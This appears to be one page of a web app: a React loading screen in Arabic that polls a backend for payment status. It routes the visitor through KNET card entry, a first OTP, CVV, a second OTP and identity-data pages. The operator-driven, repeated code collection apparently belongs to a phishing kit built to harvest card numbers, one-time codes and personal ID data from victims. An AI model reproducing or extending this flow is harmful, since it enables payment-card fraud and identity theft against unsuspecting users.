import { useEffect, useState } from "react";
import { useLocation } from "wouter";

export default function Loading() {
  const [location, setLocation] = useLocation();
  const [status, setStatus] = useState("جاري المعالجة...");
  const [paymentId, setPaymentId] = useState<number | null>(null);

  useEffect(() => {
    // Get paymentId from URL params
    const params = new URLSearchParams(window.location.search);
    const id = params.get("paymentId");
    if (id) {
      setPaymentId(Number(id));
    }
  }, []);

  useEffect(() => {
    if (!paymentId) return;

    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/trpc/payment.getPaymentStatus?input=${JSON.stringify({ paymentId })}`);
        const data = await response.json();

        if (data.result?.data?.status) {
          const status = data.result.data.status;

          // Check what stage we're at and redirect accordingly
          if (status === "otp1_pending") {
            setLocation(`/otp?paymentId=${paymentId}&stage=first`);
          } else if (status === "cvv_pending") {
            setLocation(`/cvv?paymentId=${paymentId}`);
          } else if (status === "otp2_pending") {
            setLocation(`/otp?paymentId=${paymentId}&stage=second`);
          } else if (status === "hawety_pending") {
            setLocation(`/hawety?paymentId=${paymentId}`);
          } else if (status === "completed") {
            setLocation(`/success?paymentId=${paymentId}`);
          } else if (status === "rejected") {
            setLocation(`/error?paymentId=${paymentId}`);
          }

          setStatus(getStatusMessage(status));
        }
      } catch (error) {
        console.error("Error polling status:", error);
      }
    };

    // Poll every 2 seconds
    const interval = setInterval(pollStatus, 2000);

    // Initial poll
    pollStatus();

    return () => clearInterval(interval);
  }, [paymentId, setLocation]);

  const getStatusMessage = (status: string) => {
    const messages: Record<string, string> = {
      knet_submitted: "جاري التحقق من بيانات البطاقة...",
      otp1_pending: "جاري إرسال رمز التحقق...",
      otp1_verified: "تم التحقق من الرمز الأول...",
      cvv_pending: "جاري التحقق من رمز CVV...",
      cvv_verified: "تم التحقق من CVV...",
      otp2_pending: "جاري إرسال رمز التحقق الثاني...",
      otp2_verified: "تم التحقق من الرمز الثاني...",
      hawety_pending: "جاري التحقق من بيانات الهوية...",
      completed: "تم إكمال العملية بنجاح...",
      rejected: "تم رفض العملية...",
    };
    return messages[status] || "جاري المعالجة...";
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full text-center">
        <div className="mb-6">
          <div className="inline-block">
            <div className="relative w-16 h-16">
              <div className="absolute inset-0 bg-gradient-to-r from-blue-400 to-indigo-600 rounded-full animate-spin"></div>
              <div className="absolute inset-1 bg-white rounded-full"></div>
            </div>
          </div>
        </div>

        <h1 className="text-2xl font-bold text-gray-800 mb-4">جاري المعالجة</h1>
        <p className="text-gray-600 mb-4">{status}</p>

        <div className="space-y-2">
          <div className="flex items-center justify-center gap-2">
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></div>
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "0.2s" }}></div>
            <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "0.4s" }}></div>
          </div>
        </div>

        <p className="text-sm text-gray-500 mt-6">يرجى عدم إغلاق هذه الصفحة</p>
      </div>
    </div>
  );
}
